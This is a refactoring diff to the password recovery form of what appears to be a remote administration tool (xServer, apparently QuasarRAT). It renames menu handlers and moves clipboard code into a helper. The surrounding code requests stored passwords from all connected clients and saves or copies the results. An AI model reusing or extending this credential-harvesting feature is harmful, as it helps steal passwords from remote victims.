@@ -48,7 +48,7 @@ namespace xServer.Forms
         #region Public Members
         public void RecoverPasswords()
         {
-            allToolStripMenuItem2_Click(null, null);
+            clearAllToolStripMenuItem_Click(null, null);
 
             var req = new Core.Packets.ServerPackets.GetPasswords();
             foreach (var client in _clients.Where(client => client != null))
@@ -130,17 +130,6 @@ namespace xServer.Forms
 
             return sb;
         }
-
-        private void SetClipboard(string text)
-        {
-            try
-            {
-                Clipboard.SetText(text);
-            }
-            catch (Exception)
-            {
-            }
-        }
         #endregion
 
         #region Group Methods
@@ -164,7 +153,7 @@ namespace xServer.Forms
         #region Saving
 
         #region File Saving
-        private void allToolStripMenuItem_Click(object sender, EventArgs e)
+        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData();
             using (var sfdPasswords = new SaveFileDialog())
@@ -176,7 +165,7 @@ namespace xServer.Forms
             }
         }
 
-        private void selectedToolStripMenuItem_Click(object sender, EventArgs e)
+        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData(true);
             using (var sfdPasswords = new SaveFileDialog())
@@ -189,18 +178,18 @@ namespace xServer.Forms
         }
         #endregion
         #region Clipboard Copying
-        private void allToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData();
 
-            SetClipboard(sb.ToString());
+            ClipboardHelper.SetClipboardText(sb.ToString());
         }
 
-        private void selectedToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             StringBuilder sb = GetLoginData(true);
 
-            SetClipboard(sb.ToString());
+            ClipboardHelper.SetClipboardText(sb.ToString());
         }
         #endregion
 
@@ -213,7 +202,7 @@ namespace xServer.Forms
             RecoverPasswords();
         }
 
-        private void allToolStripMenuItem2_Click(object sender, EventArgs e)
+        private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
         {
             lock (_addingLock)
             {
@@ -224,7 +213,7 @@ namespace xServer.Forms
             }
         }
 
-        private void selectedToolStripMenuItem2_Click(object sender, EventArgs e)
+        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
             {
